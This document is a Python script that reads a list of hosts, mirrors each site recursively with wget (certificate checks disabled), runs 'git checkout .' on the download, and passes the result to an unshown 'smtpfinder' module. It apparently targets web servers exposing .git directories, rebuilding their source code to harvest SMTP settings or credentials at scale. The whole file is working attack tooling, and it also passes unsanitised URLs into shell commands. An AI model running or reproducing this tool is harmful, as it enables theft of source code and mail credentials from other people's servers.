import os
import subprocess
import threading
import shutil
import requests
import smtpfinder
import time
from subprocess import PIPE

def worker(url):
    global nbth
    nbth += 1
    if "http" in str(url) or "https" in str(url):
        pass
    else:
        url = "http://" + str(url)
    if url.endswith("/"):
        pass
    else:
        url = url + "/"
    host = str(url.split("/")[2])
    formatedhost = str(host.replace(".", "-"))
    print(f"[{host}] Resolving hostname")
    try:
        r = requests.get(str(url))
        url = str(r.url)
        print(f"[{host}] Hostname : {url}")
        newhost = str(url.split("/")[2])
    except Exception as e:
        print(f"[{host}] Hostname error : " + str(e))
        nbth -= 1
        return
    try:
        print(f"[{host}] Downloading")
        downloadcmd = subprocess.run(f'wget -r --no-check-certificate --reject="index.html*" --no-parent {url}', shell=True, stdout=PIPE, stderr=PIPE)
        #print(downloadcmd.stderr.decode())
    except Exception as e:
        print(f"[{host}] Download error : " + str(e))
    try:
        print(f"[{host}] Running checkout")
        checkoutcmd = subprocess.run(f"cd {newhost} && git checkout .", shell=True, stdout=PIPE, stderr=PIPE)
    except Exception as e:
        print(f"[{host}] Error in checkout : " + str(e))
        nbth -= 1
        return
    try:
        print(f"[{host}] Finding smtp")
        smtpfinder.finder("./" + str(newhost), str(host))
        nbth -= 1
    except Exception as e:
        print(f"[{host}] Error in smtp finder : " + str(e))
        nbth -= 1
        return

if __name__ == "__main__":
    nbthread = int(input("Threads : "))
    nbth = 0
    with open("list.txt", "r", encoding='utf8') as file:
        lines = file.readlines()
        for line in lines:
            while True:
                if nbth < nbthread:
                    thread = threading.Thread(target=worker, args=[line.strip()])
                    thread.start()
                    break
                else:
                    time.sleep(5)
                    pass
